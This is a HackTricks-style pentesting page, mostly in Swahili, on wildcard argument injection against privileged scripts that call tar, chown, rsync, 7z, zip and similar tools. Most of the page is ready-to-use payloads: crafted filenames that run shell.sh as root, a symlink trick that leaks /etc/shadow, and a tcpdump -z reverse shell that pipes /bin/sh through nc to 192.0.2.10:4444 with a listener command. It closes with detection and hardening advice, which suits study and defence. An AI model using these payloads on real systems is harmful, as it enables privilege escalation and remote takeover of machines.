# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (pia inajulikana kama *glob*) **kuingiza hoja** hutokea wakati skripti yenye mamlaka inapoendesha binary ya Unix kama `tar`, `chown`, `rsync`, `zip`, `7z`, … kwa kutumia wildcard isiyo na nukuu kama `*`.
> Kwa sababu shell inapanua wildcard **kabla** ya kutekeleza binary, mshambuliaji ambaye anaweza kuunda faili katika directory ya kazi anaweza kuunda majina ya faili yanayoanza na `-` ili yaweze kutafsiriwa kama **chaguzi badala ya data**, kwa ufanisi akisafirisha bendera za kiholela au hata amri.
> Ukurasa huu unakusanya primitives muhimu zaidi, utafiti wa hivi karibuni na ugunduzi wa kisasa kwa mwaka 2023-2025.

## chown / chmod

Unaweza **kunakili mmiliki/kikundi au bits za ruhusa za faili yoyote** kwa kutumia bendera `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Wakati root baadaye anatekeleza kitu kama:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` imeingizwa, ikisababisha *faili zote* zinazolingana kurithi umiliki/ruhusa za `/root/secret``file`.

*PoC & chombo*: [`wildpwn`](https://github.com/localh0t/wildpwn) (shambulio lililounganishwa). 
Tazama pia karatasi ya jadi ya DefenseCode kwa maelezo.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Teua amri za kiholela kwa kutumia kipengele cha **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Mara tu root anapokimbia e.g. `tar -czf /root/backup.tgz *`, `shell.sh` inatekelezwa kama root.

### bsdtar / macOS 14+

`tar` ya kawaida kwenye macOS za hivi karibuni (zinazoegemea `libarchive`) *haitekelezi* `--checkpoint`, lakini bado unaweza kufikia utekelezaji wa msimbo kwa kutumia bendera **--use-compress-program** ambayo inakuwezesha kubaini compressor ya nje.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Wakati skripti yenye mamlaka inapoendesha `tar -cf backup.tar *`, `/bin/sh` itaanzishwa.

---

## rsync

`rsync` inakuwezesha kubadilisha shell ya mbali au hata binary ya mbali kupitia bendera za amri zinazaanza na `-e` au `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Ikiwa root baadaye anahifadhi saraka hiyo kwa `rsync -az * backup:/srv/`, bendera iliyoingizwa inazalisha shell yako upande wa mbali.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Hata wakati skripti yenye mamlaka *inajihifadhi* kwa kuanzisha wildcard na `--` (kuzuia uchambuzi wa chaguo), muundo wa 7-Zip unasaidia **faili za orodha za faili** kwa kuanzisha jina la faili na `@`. Kuunganisha hiyo na symlink kunakuwezesha *kuhamasisha faili zisizo na mipaka*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Ikiwa root anatekeleza kitu kama:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip itajaribu kusoma `root.txt` (→ `/etc/shadow`) kama orodha ya faili na itakataa, **ikiandika maudhui kwenye stderr**.

---

## zip

`zip` inasaidia bendera `--unzip-command` ambayo inapitishwa *kama ilivyo* kwa shell ya mfumo wakati archive itajaribiwa:
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Inject the flag via a crafted filename and wait for the privileged backup script to call `zip -T` (test archive) on the resulting file.

---

## Orodha ya ziada ya binaries zinazoweza kuathiriwa na wildcard injection (2023-2025)

Amri zifuatazo zimekuwa zikitumika vibaya katika CTF za kisasa na mazingira halisi. Payload kila wakati huundwa kama *filename* ndani ya directory inayoweza kuandikwa ambayo baadaye itashughulikiwa kwa wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Soma maudhui ya faili |
| `flock` | `-c <cmd>` | Tekeleza amri |
| `git`   | `-c core.sshCommand=<cmd>` | Utekelezaji wa amri kupitia git juu ya SSH |
| `scp`   | `-S <cmd>` | Anzisha programu isiyo ya kawaida badala ya ssh |

Hizi primitives ni za kawaida kidogo kuliko *tar/rsync/zip* za jadi lakini zina thamani ya kuangaliwa unapofanya uwindaji.

---

## tcpdump rotation hooks (-G/-W/-z): RCE kupitia argv injection katika wrappers

Wakati shell iliyopunguzika au wrapper ya muuzaji inaunda mstari wa amri wa `tcpdump` kwa kuunganisha maeneo yanayodhibitiwa na mtumiaji (kwa mfano, parameter ya "jina la faili") bila kunukuu/kuhakiki kwa ukali, unaweza kuingiza bendera za ziada za `tcpdump`. Mchanganyiko wa `-G` (mzunguko wa muda), `-W` (kizuizi cha idadi ya faili), na `-z <cmd>` (amri baada ya mzunguko) unatoa utekelezaji wa amri isiyo na mipaka kama mtumiaji anayekimbia tcpdump (mara nyingi root kwenye vifaa).

Masharti ya awali:

- Unaweza kuathiri `argv` inayopitishwa kwa `tcpdump` (kwa mfano, kupitia wrapper kama `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Wrapper haifanyi usafi wa nafasi au alama zilizoanzishwa na `-` katika uwanja wa jina la faili.

Classic PoC (inafanya kazi ya shell ya kurudi kutoka kwa njia inayoweza kuandikwa):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1` inalazimisha kugeuza mara moja baada ya pakiti ya kwanza inayolingana.
- `-z <cmd>` inatekeleza amri ya baada ya kugeuza mara moja kwa kila kugeuza. Mifumo mingi inatekeleza `<cmd> <savefile>`. Ikiwa `<cmd>` ni skripti/mkaguzi, hakikisha usimamizi wa hoja unalingana na payload yako.

No-removable-media variants:

- Ikiwa una primitive nyingine ya kuandika faili (kwa mfano, kifunguo tofauti kinachoruhusu uelekezaji wa pato), weka skripti yako kwenye njia inayojulikana na itikie `-z /bin/sh /path/script.sh` au `-z /path/script.sh` kulingana na semantics ya jukwaa.
- Baadhi ya vifunguo vya wauzaji vinageuza kwenye maeneo yanayoweza kudhibitiwa na mshambuliaji. Ikiwa unaweza kuathiri njia iliyogeuzwa (symlink/directory traversal), unaweza kuelekeza `-z` kutekeleza maudhui unayodhibiti kikamilifu bila vyombo vya nje.

Hardening tips for vendors:

- Kamwe usipite nyuzi zinazodhibitiwa na mtumiaji moja kwa moja kwa `tcpdump` (au chombo chochote) bila orodha kali za ruhusa. Nukuu na thibitisha.
- Usifichue kazi ya `-z` katika vifunguo; endesha tcpdump kwa kigezo salama kilichowekwa na kataza bendera za ziada kabisa.
- Punguza mamlaka ya tcpdump (cap_net_admin/cap_net_raw pekee) au endesha chini ya mtumiaji asiye na mamlaka aliye na kizuizi cha AppArmor/SELinux.

## Detection & Hardening

1. **Zima shell globbing** katika skripti muhimu: `set -f` (`set -o noglob`) inazuia upanuzi wa wildcard.
2. **Nukuu au kimbia** hoja: `tar -czf "$dst" -- *` si salama — pendelea `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
3. **Njia maalum**: Tumia `/var/www/html/*.log` badala ya `*` ili washambuliaji wasiweze kuunda faili za ndugu zinazooanza na `-`.
4. **Mamlaka ya chini**: Endesha kazi za akiba/utunzaji kama akaunti ya huduma isiyo na mamlaka badala ya root kila wakati inapowezekana.
5. **Ufuatiliaji**: Kanuni iliyojengwa awali ya Elastic *Potential Shell via Wildcard Injection* inatafuta `tar --checkpoint=*`, `rsync -e*`, au `zip --unzip-command` mara moja ikifuatwa na mchakato wa mtoto wa shell. Uchunguzi wa EQL unaweza kubadilishwa kwa EDR zingine.

---

## References

* Elastic Security – Potential Shell via Wildcard Injection Detected rule (last updated 2025)
* Rutger Flohil – “macOS — Tar wildcard injection” (Dec 18 2024)
* GTFOBins – [tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
* FiberGateway GR241AG – [Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
